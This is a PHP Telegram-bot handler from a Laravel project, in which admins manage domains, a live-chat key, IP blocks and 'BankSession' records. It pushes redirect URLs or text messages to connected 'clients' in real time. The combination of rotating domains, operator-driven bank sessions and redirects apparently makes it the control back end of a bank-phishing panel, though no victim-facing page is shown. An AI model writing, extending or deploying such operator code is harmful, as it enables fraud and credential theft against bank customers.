<?php

namespace App\Telegram\Handlers;

use App\Enums\ActionType;
use App\Events\BankSessionUpdated;
use App\Models\Admin;
use App\Models\BankSession;
use SergiX44\Nutgram\Nutgram;

class MessageHandler
{
    public function handle(Nutgram $bot, string $text = ''): void
    {
        /** @var Admin|null $admin */
        $admin = $bot->get('admin');
        if ($admin === null || !$admin->hasPendingAction()) {
            return;
        }

        $pending = $admin->pending_action;
        $type    = $pending['type'] ?? null;

        match ($type) {
            'admin_add'     => app(AdminPanelHandler::class)->processAddAdmin($bot, $admin, $text),
            'smartsupp_key' => app(SmartSuppHandler::class)->processSetKey($bot, $admin, $text),
            'domain_add'    => app(DomainHandler::class)->processAddDomain($bot, $admin, $text),
            'domain_edit'   => app(DomainHandler::class)->processEditDomain($bot, $admin, $pending['domain'] ?? '', $text),
            'block_ip'      => $text === '*'
                                ? app(BlockIpHandler::class)->confirmBlock($bot, $admin, $pending['sessionId'] ?? '')
                                : $bot->sendMessage('❌ Отправьте <b>*</b> для подтверждения', parse_mode: 'HTML'),
            'session'       => $this->handleSessionAction($bot, $admin, $pending, $text),
            default         => $admin->clearPendingAction(),
        };
    }

    private function handleSessionAction(Nutgram $bot, Admin $admin, array $pending, string $text): void
    {
        $type    = ActionType::tryFrom($pending['actionType'] ?? '');
        $session = BankSession::find($pending['sessionId'] ?? '');

        if ($type === null || $session === null) {
            $admin->clearPendingAction();
            $bot->sendMessage('Действие недействительно; сброшено.');
            return;
        }

        $command = ['type' => $type->value];
        if ($type->requiresUrl()) {
            $command['url'] = trim($text);
        } else {
            $command['text'] = $text;
        }
        $session->action_type      = $command;
        $session->last_activity_at = now();
        $session->save();

        $admin->clearPendingAction();
        BankSessionUpdated::dispatch($session);
        $bot->sendMessage('✓ Отправлено клиенту.');
    }
}
